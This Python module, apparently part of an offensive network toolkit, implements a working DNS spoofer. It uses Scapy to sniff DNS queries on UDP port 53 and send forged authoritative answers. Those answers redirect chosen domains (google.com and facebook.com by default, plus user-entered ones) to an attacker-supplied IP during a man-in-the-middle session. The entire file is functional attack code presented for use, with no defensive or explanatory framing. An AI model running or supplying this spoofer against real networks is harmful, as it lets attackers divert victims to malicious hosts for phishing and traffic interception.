from scapy.all import IP, UDP, DNS, DNSRR, DNSQR, send, sniff
from rich.console import Console
from core.ui import draw_header

console = Console()

# Mapping of domains to spoof and their destination IPs
# Example: "target.com": "192.168.1.50"
SPOOF_MAP = {
    "google.com": "1.1.1.1", # Example redirection
    "facebook.com": "1.1.1.1"
}

def dns_spoofer_callback(packet):
    """
    Analyzes DNS queries and sends a forged response if the domain matches our list.
    """
    if packet.haslayer(DNSQR): # Check if it's a DNS Question
        queried_domain = packet[DNSQR].qname.decode().strip('.')
        
        if queried_domain in SPOOF_MAP:
            console.print(f"[bold red][!] Intercepted query for:[/bold red] {queried_domain}")
            
            # Craft the forged DNS response
            # 
            spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                          UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                          DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                              an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=SPOOF_MAP[queried_domain]))
            
            send(spoofed_pkt, verbose=False)
            console.print(f"[bold green][+] Redirected {queried_domain} to {SPOOF_MAP[queried_domain]}[/bold green]")

def start_dns_spoof():
    draw_header("DNS Spoofer")
    console.print("[bold yellow][*] Configuring Spoof Map...[/bold yellow]")
    
    domain = console.input("[bold cyan]Enter Domain to spoof (e.g., google.com): [/bold cyan]").strip()
    redirect_ip = console.input("[bold cyan]Enter Redirect IP: [/bold cyan]").strip()
    
    if domain and redirect_ip:
        SPOOF_MAP[domain] = redirect_ip

    console.print(f"\n[bold red][!] DNS Spoofer Active.[/bold red] Monitoring for: {list(SPOOF_MAP.keys())}")
    console.print("[dim]Note: This requires an active MITM session to intercept the queries.[/dim]\n")
    
    try:
        # Sniff specifically for DNS traffic (UDP Port 53)
        sniff(filter="udp port 53", prn=dns_spoofer_callback, store=0)
    except KeyboardInterrupt:
        console.print("\n[yellow][*] DNS Spoofer stopped.[/yellow]")
        input("\nPress Enter to return...")